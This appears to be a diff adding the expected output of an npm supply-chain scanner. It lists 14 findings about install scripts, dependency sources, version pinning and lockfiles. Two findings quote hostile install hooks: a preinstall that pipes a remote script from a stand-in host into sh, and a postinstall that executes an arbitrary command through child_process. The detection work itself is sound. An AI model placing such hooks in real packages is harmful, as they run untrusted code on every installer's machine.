@@ -1,0 +1,29 @@
+4 files, 14 findings
+HIGH     NPM006 legacy/package-lock.json#minimist
+         resolved over plain HTTP: http://registry.example.test/minimist/-/minimist-1.2.0.tgz
+HIGH     NPM001 webapp/package.json#scripts.postinstall
+         postinstall downloads, evaluates or decodes code at install time: node -e "require('child_process').execSync(process.env.CMD)"
+HIGH     NPM001 webapp/package.json#scripts.preinstall
+         preinstall downloads, evaluates or decodes code at install time: curl -s https://cdn.example.test/setup.sh | sh
+HIGH     NPM003 webapp/package.json#dependencies.internal-ui
+         internal-ui comes from git+https://git.example.test/ui.git#main, not the registry: the code can change without a version bump
+HIGH     NPM003 webapp/package.json#dependencies.left-pad-fork
+         left-pad-fork comes from github:someone/left-pad, not the registry: the code can change without a version bump
+HIGH     NPM003 webapp/package.json#dependencies.legacy-lib
+         legacy-lib is fetched over plain HTTP from http://files.example.test/legacy-lib-1.0.0.tgz
+MEDIUM   NPM002 webapp/package.json#scripts.postinstall
+         postinstall runs on install: node -e "require('child_process').execSync(process.env.CMD)"
+MEDIUM   NPM002 webapp/package.json#scripts.preinstall
+         preinstall runs on install: curl -s https://cdn.example.test/setup.sh | sh
+MEDIUM   NPM004 webapp/package.json#dependencies.chart-kit
+         chart-kit accepts any version ("latest")
+MEDIUM   NPM004 webapp/package.json#dependencies.utils
+         utils accepts any version ("*")
+LOW      NPM009 legacy/package-lock.json#mkdirp
+         no integrity hash for the resolved tarball
+LOW      NPM002 webapp/package.json#scripts.prepare
+         prepare runs on install: husky install
+LOW      NPM005 webapp/package.json#devDependencies.shared
+         shared is a local path (file:../shared)
+LOW      NPM008 webapp/package.json
+         no lockfile next to this manifest: installs can resolve to different versions each time
